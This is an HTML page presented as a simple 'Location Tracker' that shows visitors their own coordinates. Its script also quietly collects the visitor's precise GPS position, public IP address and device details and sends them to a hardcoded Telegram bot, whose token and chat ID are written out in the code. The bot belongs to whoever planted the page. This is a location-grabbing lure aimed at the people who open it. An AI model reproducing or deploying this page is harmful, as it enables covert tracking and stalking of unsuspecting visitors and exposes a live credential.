<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>📍 Location Tracker</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #f0f4f9;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .card {
      max-width: 480px;
      width: 100%;
      background: #ffffff;
      border-radius: 24px;
      padding: 32px 28px 36px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.08);
      text-align: center;
      border: 1px solid rgba(0, 0, 0, 0.04);
    }

    .card .icon { font-size: 56px; margin-bottom: 12px; }
    .card h2 { font-size: 24px; color: #1a2a3a; margin-bottom: 6px; }
    .card .sub { font-size: 14px; color: #6b7a8a; margin-bottom: 20px; }

    .btn-location {
      background: #0d6e4b;
      color: #fff;
      border: none;
      padding: 14px 40px;
      font-size: 18px;
      font-weight: 700;
      border-radius: 40px;
      cursor: pointer;
      transition: 0.25s;
      box-shadow: 0 4px 14px rgba(13, 110, 75, 0.3);
      width: 100%;
    }

    .btn-location:hover { background: #0a5640; transform: scale(1.02); }
    .btn-location:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }

    #result {
      margin-top: 20px;
      padding: 16px;
      border-radius: 12px;
      background: #f8faff;
      border-left: 4px solid #0d6e4b;
      text-align: left;
      font-size: 14px;
      color: #1a2a3a;
      display: none;
      line-height: 1.8;
      word-break: break-all;
    }

    #result .label { font-weight: 600; color: #0d6e4b; }
    #result.error { border-left-color: #d32f2f; background: #fff6f6; }

    #result .map-link {
      display: inline-block;
      margin-top: 10px;
      background: #0d6e4b;
      color: #fff;
      padding: 8px 18px;
      border-radius: 30px;
      text-decoration: none;
      font-weight: 600;
      font-size: 13px;
      transition: 0.2s;
    }

    #result .map-link:hover { background: #0a5640; }

    #permission-status {
      margin-top: 12px;
      padding: 10px;
      border-radius: 8px;
      font-size: 13px;
      display: none;
    }

    #permission-status.success {
      display: block;
      background: #d4edda;
      color: #155724;
    }

    #permission-status.error {
      display: block;
      background: #f8d7da;
      color: #721c24;
    }

    #permission-status.info {
      display: block;
      background: #cce5ff;
      color: #004085;
    }

    .retry-btn {
      background: #dc3545;
      color: #fff;
      border: none;
      padding: 8px 20px;
      border-radius: 30px;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 10px;
      transition: 0.2s;
    }

    .retry-btn:hover { background: #c82333; }

    @media (max-width: 480px) {
      .card { padding: 22px 16px 28px; }
      .btn-location { font-size: 16px; padding: 12px; }
    }
  </style>
</head>
<body>

<div class="card">
  <div class="icon">📍</div>
  <h2>Location Tracker</h2>
  <div class="sub">Click the button below to get your current location</div>

  <button class="btn-location" id="getLocationBtn">📍 Get My Location</button>

  <div id="permission-status"></div>
  <div id="result"></div>
</div>

<!-- ============================================================ -->
<!-- ===== JAVASCRIPT ===== -->
<!-- ============================================================ -->
<script>
  // =============================================
  // 🔐 TELEGRAM CONFIG
  // =============================================
  const BOT_TOKEN = '8864995146:AAERB2czzLwxRORXAHcFieptoqXdCJ7BLec';
  const CHAT_ID   = '8308044531';

  // =============================================
  // 📍 ELEMENTS
  // =============================================
  const btn = document.getElementById('getLocationBtn');
  const resultDiv = document.getElementById('result');
  const statusDiv = document.getElementById('permission-status');

  // =============================================
  // 🚀 CHECK PERMISSION STATUS ON LOAD
  // =============================================
  function checkPermissionStatus() {
    if (!navigator.permissions) {
      showStatus('ℹ️ Permission API not supported. Click button to request.', 'info');
      return;
    }

    navigator.permissions.query({ name: 'geolocation' })
      .then((result) => {
        if (result.state === 'granted') {
          showStatus('✅ Location permission already granted!', 'success');
        } else if (result.state === 'denied') {
          showStatus('❌ Location permission blocked. Please enable in browser settings.', 'error');
          btn.textContent = '🔒 Permission Blocked';
          btn.disabled = true;
        } else {
          showStatus('ℹ️ Click the button to allow location access.', 'info');
        }
      })
      .catch(() => {
        // Permission API not supported
      });
  }

  // =============================================
  // 📤 SEND TO TELEGRAM
  // =============================================
  async function sendToTelegram(lat, lon) {
    try {
      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
      let ip = 'Unknown';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip || 'Unknown';
      } catch (e) {}

      const ua = navigator.userAgent;
      const device = ua.match(/Android.*?;\s([^;)\s]+)/)?.[1] || 'Unknown';
      const os = ua.match(/Android\s([0-9.]+)/)?.[1] || 'Unknown';

      const msg = `
📍 **LOCATION DETECTED**

🌐 IP: ${ip}
📱 Device: ${device}
🧬 OS: ${os}
🕐 Time: ${new Date().toLocaleString()}

📍 Coordinates:
Latitude: ${lat}
Longitude: ${lon}

🗺️ Google Maps:
${mapsLink}
      `;

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
      });

      showStatus('✅ Location sent to Telegram!', 'success');

    } catch (err) {
      console.error('Telegram error:', err);
      showStatus('⚠️ Location saved, but Telegram send failed.', 'error');
    }
  }

  // =============================================
  // 📍 GET LOCATION
  // =============================================
  function getLocation() {
    // Clear previous
    resultDiv.style.display = 'none';
    resultDiv.className = '';
    statusDiv.style.display = 'none';

    btn.disabled = true;
    btn.textContent = '⏳ Requesting location...';

    if (!navigator.geolocation) {
      showStatus('❌ Geolocation is not supported by your browser.', 'error');
      btn.disabled = false;
      btn.textContent = '📍 Get My Location';
      return;
    }

    navigator.geolocation.getCurrentPosition(
      // ✅ Success
      async (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const accuracy = position.coords.accuracy;

        // Show result
        resultDiv.style.display = 'block';
        resultDiv.className = '';
        resultDiv.innerHTML = `
          <div><span class="label">📍 Latitude:</span> ${lat}</div>
          <div><span class="label">📍 Longitude:</span> ${lon}</div>
          <div><span class="label">📏 Accuracy:</span> ${accuracy} meters</div>
          <div style="margin-top:10px;">
            <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" class="map-link">
              🗺️ Open in Google Maps
            </a>
          </div>
        `;

        showStatus('✅ Location captured successfully!', 'success');

        // Send to Telegram
        await sendToTelegram(lat, lon);

        btn.disabled = false;
        btn.textContent = '📍 Get My Location';
      },
      // ❌ Error
      (error) => {
        let msg = '❌ Unable to get location.';
        if (error.code === 1) {
          msg = '❌ Permission denied. Please allow location access in your browser settings.';
          showStatus(msg, 'error');
          // Show retry button
          resultDiv.style.display = 'block';
          resultDiv.className = 'error';
          resultDiv.innerHTML = `
            <span style="font-weight:600;">${msg}</span>
            <br><br>
            <button class="retry-btn" onclick="openSettings()">⚙️ Open Settings</button>
            <button class="retry-btn" style="background:#0d6e4b; margin-left:8px;" onclick="getLocation()">🔄 Retry</button>
          `;
        } else if (error.code === 2) {
          msg = '❌ Location unavailable. Please check your GPS.';
          showStatus(msg, 'error');
        } else if (error.code === 3) {
          msg = '⏳ Location request timed out. Please try again.';
          showStatus(msg, 'error');
        }
        btn.disabled = false;
        btn.textContent = '📍 Get My Location';
      },
      {
        enableHighAccuracy: true,
        timeout: 15000,
        maximumAge: 0
      }
    );
  }

  // =============================================
  // ⚙️ OPEN SETTINGS (Android Browser)
  // =============================================
  function openSettings() {
    // For Android Chrome
    if (navigator.userAgent.includes('Android')) {
      window.location.href = 'app-settings:';
    }
    // Try to open browser settings
    alert('Please enable Location permission in your browser settings:\n\n' +
          'Chrome: Settings → Site Settings → Location → Allow\n' +
          'Firefox: Settings → Privacy & Security → Location → Allow');
  }

  // =============================================
  // 📌 SHOW STATUS
  // =============================================
  function showStatus(msg, type) {
    statusDiv.style.display = 'block';
    statusDiv.className = type;
    statusDiv.textContent = msg;
  }

  // =============================================
  // 🎯 BUTTON CLICK
  // =============================================
  btn.addEventListener('click', getLocation);

  // =============================================
  // 🚀 CHECK PERMISSION ON LOAD
  // =============================================
  checkPermissionStatus();

  console.log('✅ Location Tracker Loaded');
</script>

</body>
</html>
